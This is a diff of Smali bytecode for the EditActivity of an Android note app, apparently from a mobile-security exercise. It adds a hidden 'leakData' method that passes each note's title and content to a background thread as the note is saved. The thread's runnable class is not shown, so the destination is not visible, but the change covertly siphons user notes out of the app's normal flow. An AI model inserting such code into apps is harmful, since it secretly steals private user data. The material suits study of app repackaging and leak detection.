@@ -435,6 +435,9 @@
 
     .line 101
     .local v2, "content":Ljava/lang/String;
+    invoke-direct {p0, v1, v2}, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->leakData(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 102
     invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z
 
     move-result v3
@@ -443,7 +446,7 @@
 
     if-nez v3, :cond_0
 
-    .line 102
+    .line 103
     new-instance v3, Ljava/io/OutputStreamWriter;
 
     iget-object v5, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->filename:Ljava/lang/String;
@@ -456,7 +459,7 @@
 
     move-object v0, v3
 
-    .line 103
+    .line 104
     new-instance v3, Ljava/lang/StringBuilder;
 
     invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
@@ -475,7 +478,7 @@
 
     invoke-virtual {v0, v3}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V
 
-    .line 104
+    .line 105
     invoke-virtual {p0}, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v3
@@ -494,7 +497,7 @@
 
     goto :goto_0
 
-    .line 107
+    .line 108
     :cond_0
     invoke-virtual {p0}, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->getApplicationContext()Landroid/content/Context;
 
@@ -517,7 +520,7 @@
 
     goto :goto_0
 
-    .line 113
+    .line 114
     .end local v1    # "title":Ljava/lang/String;
     .end local v2    # "content":Ljava/lang/String;
     :catchall_0
@@ -525,11 +528,11 @@
 
     goto :goto_1
 
-    .line 109
+    .line 110
     :catch_0
     move-exception v1
 
-    .line 110
+    .line 111
     .local v1, "t":Ljava/lang/Throwable;
     :try_start_1
     new-instance v2, Ljava/lang/StringBuilder;
@@ -560,20 +563,47 @@
     :try_end_1
     .catchall {:try_start_1 .. :try_end_1} :catchall_0
 
-    .line 113
+    .line 114
     .end local v1    # "t":Ljava/lang/Throwable;
     :goto_0
     invoke-static {v0}, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->closeStream(Ljava/io/Closeable;)V
 
-    .line 114
+    .line 115
     nop
 
-    .line 115
+    .line 116
     return-void
 
-    .line 113
+    .line 114
     :goto_1
     invoke-static {v0}, Lde/up/cs/mapawo/ms/memonemo/EditActivity;->closeStream(Ljava/io/Closeable;)V
 
     throw v1
+.end method
+
+.method private leakData(Ljava/lang/String;Ljava/lang/String;)V
+    .locals 2
+    .param p1, "title"    # Ljava/lang/String;
+    .param p2, "content"    # Ljava/lang/String;
+    .annotation system Ldalvik/annotation/Throws;
+        value = {
+            Ljava/lang/Exception;
+        }
+    .end annotation
+
+    .line 169
+    new-instance v0, Ljava/lang/Thread;
+
+    new-instance v1, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;
+
+    invoke-direct {v1, p0, p1, p2}, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;-><init>(Lde/up/cs/mapawo/ms/memonemo/EditActivity;Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+
+    .line 193
+    .local v0, "thread":Ljava/lang/Thread;
+    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
+
+    .line 194
+    return-void
 .end method
